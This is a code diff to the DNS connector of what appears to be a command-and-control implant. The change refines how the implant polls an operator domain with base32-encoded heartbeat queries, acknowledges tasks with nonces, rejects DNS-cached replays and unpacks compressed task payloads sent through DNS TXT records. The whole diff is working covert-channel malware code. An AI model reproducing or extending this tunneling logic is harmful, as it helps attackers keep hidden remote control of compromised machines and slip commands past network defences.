@@ -542,28 +542,39 @@ void ConnectorDNS::SendData(BYTE* data, ULONG data_size)
         DnsDebugLogf("[DNS] [UP] PUT done total=%lu", total);
         
         // After PUT, send ACK heartbeat with nonce to confirm task was received
+        // After PUT, send ACK heartbeat with taskNonce to confirm which task was completed
+        // HB data format: [ackOffset:4][hbNonce:4][ackTaskNonce:4] = 12 bytes
         if (this->downAckOffset > 0) {
             ULONG ackNonce = GetTickCount() ^ (this->seq * 7919) ^ 0xACEACE;
-            BYTE ackData[8];
+            BYTE ackData[12];
+            // ackOffset (big-endian)
             ackData[0] = (BYTE)((this->downAckOffset >> 24) & 0xFF);
             ackData[1] = (BYTE)((this->downAckOffset >> 16) & 0xFF);
             ackData[2] = (BYTE)((this->downAckOffset >> 8) & 0xFF);
             ackData[3] = (BYTE)((this->downAckOffset >> 0) & 0xFF);
+            // hbNonce (big-endian)
             ackData[4] = (BYTE)((ackNonce >> 24) & 0xFF);
             ackData[5] = (BYTE)((ackNonce >> 16) & 0xFF);
             ackData[6] = (BYTE)((ackNonce >> 8) & 0xFF);
             ackData[7] = (BYTE)((ackNonce >> 0) & 0xFF);
-            CHAR ackLabel[24];
+            // ackTaskNonce (big-endian) - to identify which task is being ACKed
+            ackData[8] = (BYTE)((this->downTaskNonce >> 24) & 0xFF);
+            ackData[9] = (BYTE)((this->downTaskNonce >> 16) & 0xFF);
+            ackData[10] = (BYTE)((this->downTaskNonce >> 8) & 0xFF);
+            ackData[11] = (BYTE)((this->downTaskNonce >> 0) & 0xFF);
+            CHAR ackLabel[32]; // Increased for 12 bytes base32 encoded
             memset(ackLabel, 0, sizeof(ackLabel));
-            DnsBase32Encode(ackData, 8, ackLabel, sizeof(ackLabel));
+            DnsBase32Encode(ackData, 12, ackLabel, sizeof(ackLabel));
             
             CHAR ackQname[256];
             DnsBuildQName(this->sid, "hb", ++this->seq, this->idx, ackLabel, this->domain, ackQname, sizeof(ackQname));
             BYTE tmp[16];
             ULONG tmpSize = 0;
             DnsQueryTxt(ackQname, (CHAR*)this->profile.resolvers, "A", tmp, sizeof(tmp), &tmpSize);
-            DnsDebugLogf("[DNS] [UP] ACK sid=%s ack=%lu nonce=%08x", this->sid, this->downAckOffset, ackNonce);
-            this->downAckOffset = 0;
+            DnsDebugLogf("[DNS] [UP] ACK sid=%s ack=%lu nonce=%08x taskNonce=%08lx", 
+                         this->sid, this->downAckOffset, ackNonce, this->downTaskNonce);
+            // NOTE: Do NOT reset downAckOffset here! Keep it so subsequent HB requests
+            // continue to carry the ACK until server confirms (no_tasks) or new task starts.
         }
         return;
     }
@@ -606,28 +617,37 @@ void ConnectorDNS::SendData(BYTE* data, ULONG data_size)
     // 则先发送一个轻量级的 A 记录查询作为心跳。
     // - 如果 TS 返回 0.0.0.0 -> 无任务，直接返回（进入 Sleep）。
     // - 如果 TS 返回 非 0.0.0.0 -> 有任务，继续执行下面的 TXT 查询拉取数据。
-    // ACK 机制：在心跳 A 查询中携带 downAckOffset，告知服务器已确认接收的 offset。
+    // ACK 机制：在心跳 A 查询中携带 downAckOffset 和 downTaskNonce，告知服务器已确认接收的 offset。
+    // HB 数据格式: [ackOffset:4][hbNonce:4][ackTaskNonce:4] = 12 字节
     if (!this->downBuf && this->qtype[0] == 'T') { // starts with 'T' -> TXT
         CHAR qnameA[512];
-        // APT: Include ack_offset AND nonce to prevent caching
+        // APT: Include ack_offset, hbNonce (cache bust), and ackTaskNonce (to identify which task is being ACKed)
         ULONG hbNonce = GetTickCount() ^ (this->seq * 7919);
-        BYTE hbData[8];
+        BYTE hbData[12];
+        // ackOffset (big-endian)
         hbData[0] = (BYTE)((this->downAckOffset >> 24) & 0xFF);
         hbData[1] = (BYTE)((this->downAckOffset >> 16) & 0xFF);
         hbData[2] = (BYTE)((this->downAckOffset >> 8) & 0xFF);
         hbData[3] = (BYTE)((this->downAckOffset >> 0) & 0xFF);
+        // hbNonce (big-endian) - for cache busting
         hbData[4] = (BYTE)((hbNonce >> 24) & 0xFF);
         hbData[5] = (BYTE)((hbNonce >> 16) & 0xFF);
         hbData[6] = (BYTE)((hbNonce >> 8) & 0xFF);
         hbData[7] = (BYTE)((hbNonce >> 0) & 0xFF);
-        CHAR hbLabel[24];
+        // ackTaskNonce (big-endian) - to identify which task is being ACKed
+        hbData[8] = (BYTE)((this->downTaskNonce >> 24) & 0xFF);
+        hbData[9] = (BYTE)((this->downTaskNonce >> 16) & 0xFF);
+        hbData[10] = (BYTE)((this->downTaskNonce >> 8) & 0xFF);
+        hbData[11] = (BYTE)((this->downTaskNonce >> 0) & 0xFF);
+        CHAR hbLabel[32]; // Increased size for 12 bytes base32 encoded
         memset(hbLabel, 0, sizeof(hbLabel));
-        DnsBase32Encode(hbData, 8, hbLabel, sizeof(hbLabel));
+        DnsBase32Encode(hbData, 12, hbLabel, sizeof(hbLabel));
         ULONG hbLogicalSeq = this->seq + 1;
         ULONG hbWireSeq = DnsBuildWireSeq(hbLogicalSeq, kDnsSignalBitsDNS);
         DnsBuildQName(this->sid, "hb", hbWireSeq, this->idx, hbLabel, this->domain, qnameA, sizeof(qnameA));
         
-        DnsDebugLogf("[DNS] [HB-REQ] sid=%s seq=%lu ack=%lu nonce=%08x", this->sid, this->seq + 1, this->downAckOffset, hbNonce);
+        DnsDebugLogf("[DNS] [HB-REQ] sid=%s seq=%lu ack=%lu nonce=%08x taskNonce=%08lx", 
+                     this->sid, this->seq + 1, this->downAckOffset, hbNonce, this->downTaskNonce);
         
         BYTE ipBuf[16];
         ULONG ipSize = 0;
@@ -728,15 +748,73 @@ void ConnectorDNS::SendData(BYTE* data, ULONG data_size)
             const ULONG maxDownloadSize = 4 << 20; // 4MB
             if (total > 0 && total <= maxDownloadSize && offset < total) {
                 // NEW DESIGN: Verify received offset matches what we requested.
-                // If mismatched (due to DNS caching), discard and will retry next round.
+                // Special case: if we requested offset>0 but got offset=0, this might be
+                // a new task from server restart. Check taskNonce to decide.
                 if (offset != reqOffset) {
-                    DnsDebugLogf("[DNS] [DOWN-CHUNK] offset_mismatch got=%lu want=%lu discard", offset, reqOffset);
-                    return; // Discard, will retry with same reqOffset next time
+                    // If server returns offset=0 but we wanted offset>0, check if it's a new task
+                    if (offset == 0 && reqOffset > 0 && chunkLen >= 9) {
+                        ULONG newTaskNonce = 0;
+                        newTaskNonce |= (ULONG)binBuf[headerSize + 1];
+                        newTaskNonce |= ((ULONG)binBuf[headerSize + 2] << 8);
+                        newTaskNonce |= ((ULONG)binBuf[headerSize + 3] << 16);
+                        newTaskNonce |= ((ULONG)binBuf[headerSize + 4] << 24);
+                        
+                        if (newTaskNonce != 0 && newTaskNonce != this->downTaskNonce) {
+                            // Different taskNonce: Server restarted with new task, reset our state
+                            DnsDebugLogf("[DNS] [DOWN-CHUNK] SERVER_RESTART: new_nonce=%08lx old_nonce=%08lx - resetting", 
+                                         newTaskNonce, this->downTaskNonce);
+                            if (this->downBuf) {
+                                MemFreeLocal((LPVOID*)&this->downBuf, this->downTotal);
+                            }
+                            this->downBuf = NULL;
+                            this->downTotal = 0;
+                            this->downFilled = 0;
+                            this->downAckOffset = 0;
+                            this->downTaskNonce = 0;
+                            // Don't return - let it fall through to process this as new task
+                        } else {
+                            // Same taskNonce or unknown: probably cached old response, discard
+                            DnsDebugLogf("[DNS] [DOWN-CHUNK] offset_mismatch got=%lu want=%lu discard", offset, reqOffset);
+                            return;
+                        }
+                    } else {
+                        DnsDebugLogf("[DNS] [DOWN-CHUNK] offset_mismatch got=%lu want=%lu discard", offset, reqOffset);
+                        return; // Discard, will retry with same reqOffset next time
+                    }
+                }
+                
+                // Check taskNonce from first chunk (offset=0) to detect new task
+                // Frame format: [flags:1][taskNonce:4][origLen:4][payload]
+                ULONG chunkTaskNonce = 0;
+                if (offset == 0 && chunkLen >= 9) {
+                    // Parse taskNonce from chunk (little-endian, bytes 1-4)
+                    chunkTaskNonce |= (ULONG)binBuf[headerSize + 1];
+                    chunkTaskNonce |= ((ULONG)binBuf[headerSize + 2] << 8);
+                    chunkTaskNonce |= ((ULONG)binBuf[headerSize + 3] << 16);
+                    chunkTaskNonce |= ((ULONG)binBuf[headerSize + 4] << 24);
                 }
                 
                 // Initialize buffer if needed (starting a NEW task)
-                if (!this->downBuf || this->downTotal != total) {
-                    // CRITICAL: If total changed, this is a NEW task from server restart
+                BOOL isNewTask = (!this->downBuf || this->downTotal != total);
+                // Also check taskNonce: if nonce differs, it's a new task even if total is same
+                if (!isNewTask && offset == 0 && chunkTaskNonce != 0 && chunkTaskNonce != this->downTaskNonce) {
+                    DnsDebugLogf("[DNS] [DOWN-CHUNK] taskNonce_changed old=%08lx new=%08lx restart", 
+                                 this->downTaskNonce, chunkTaskNonce);
+                    isNewTask = TRUE;
+                }
+                
+                // CRITICAL: Reject cached replay of just-completed task
+                // If downAckOffset > 0 (just completed a task) and taskNonce matches the old one,
+                // this is likely a DNS cache replaying the old task response. Ignore it.
+                if (isNewTask && offset == 0 && chunkTaskNonce != 0 && 
+                    chunkTaskNonce == this->downTaskNonce && this->downAckOffset > 0) {
+                    DnsDebugLogf("[DNS] [DOWN-CHUNK] REJECT: cached replay of completed task nonce=%08lx ack=%lu",
+                                 chunkTaskNonce, this->downAckOffset);
+                    return; // Ignore this cached response
+                }
+                
+                if (isNewTask) {
+                    // CRITICAL: If total or taskNonce changed, this is a NEW task
                     // We must discard current chunk and restart from offset=0
                     if (this->downBuf && this->downTotal) {
                         DnsDebugLogf("[DNS] [DOWN-CHUNK] task_changed old_total=%lu new_total=%lu restart", 
@@ -752,7 +830,8 @@ void ConnectorDNS::SendData(BYTE* data, ULONG data_size)
                     this->downTotal  = total;
                     this->downFilled = 0;
                     this->downAckOffset = 0; // Reset ACK offset for NEW task
-                    DnsDebugLogf("[DNS] [DOWN-ASM] new_task total=%lu", total);
+                    this->downTaskNonce = chunkTaskNonce; // Record new task nonce
+                    DnsDebugLogf("[DNS] [DOWN-ASM] new_task total=%lu nonce=%08lx", total, chunkTaskNonce);
                     
                     // If current chunk offset != 0, discard it and request from 0 next time
                     if (offset != 0) {
@@ -775,31 +854,35 @@ void ConnectorDNS::SendData(BYTE* data, ULONG data_size)
                              this->sid, this->downFilled, this->downTotal);
                 if (this->downFilled >= this->downTotal) {
                     DnsDebugLogf("[DNS] [DOWN-ASM] sid=%s complete total=%lu", this->sid, this->downTotal);
-                    // 解析会话头：[flags][orig_len_le]，然后将原始 payload 交给上层。
+                    // 解析会话头：[flags:1][taskNonce:4][origLen:4]，然后将原始 payload 交给上层。
+                    // 帧头大小 = 1 + 4 + 4 = 9 字节
+                    const ULONG frameHeaderSize = 9;
                     BYTE* finalBuf   = this->downBuf;
                     ULONG finalSize  = this->downTotal;
-                    if (this->downTotal > 5) {
+                    if (this->downTotal > frameHeaderSize) {
                         BYTE  flags = this->downBuf[0];
+                        // taskNonce at bytes 1-4 (already parsed earlier, skip here)
+                        // origLen at bytes 5-8 (little-endian)
                         ULONG orig  = 0;
-                        orig |= (ULONG)this->downBuf[1];
-                        orig |= ((ULONG)this->downBuf[2] << 8);
-                        orig |= ((ULONG)this->downBuf[3] << 16);
-                        orig |= ((ULONG)this->downBuf[4] << 24);
+                        orig |= (ULONG)this->downBuf[5];
+                        orig |= ((ULONG)this->downBuf[6] << 8);
+                        orig |= ((ULONG)this->downBuf[7] << 16);
+                        orig |= ((ULONG)this->downBuf[8] << 24);
 
                         if ((flags & 0x1) && orig > 0 && orig <= (4u << 20)) {
                             // 压缩路径：使用 DEFLATE 解压下行 payload。
                             BYTE* outBuf = NULL;
-                            if (DeflateDecompress(this->downBuf + 5, this->downTotal - 5, &outBuf, orig) && outBuf) {
+                            if (DeflateDecompress(this->downBuf + frameHeaderSize, this->downTotal - frameHeaderSize, &outBuf, orig) && outBuf) {
                                 finalBuf  = outBuf;
                                 finalSize = orig;
                                 MemFreeLocal((LPVOID*)&this->downBuf, this->downTotal);
                                 this->downBuf = NULL;
                             }
-                        } else if (flags == 0 && orig > 0 && orig <= this->downTotal - 5) {
-                            // 无压缩：直接跳过 5 字节头部，仅将原始任务 payload 交给上层。
+                        } else if (flags == 0 && orig > 0 && orig <= this->downTotal - frameHeaderSize) {
+                            // 无压缩：直接跳过 9 字节头部，仅将原始任务 payload 交给上层。
                             BYTE* outBuf = (BYTE*)MemAllocLocal(orig);
                             if (outBuf) {
-                                memcpy(outBuf, this->downBuf + 5, orig);
+                                memcpy(outBuf, this->downBuf + frameHeaderSize, orig);
                                 finalBuf  = outBuf;
                                 finalSize = orig;
                                 MemFreeLocal((LPVOID*)&this->downBuf, this->downTotal);
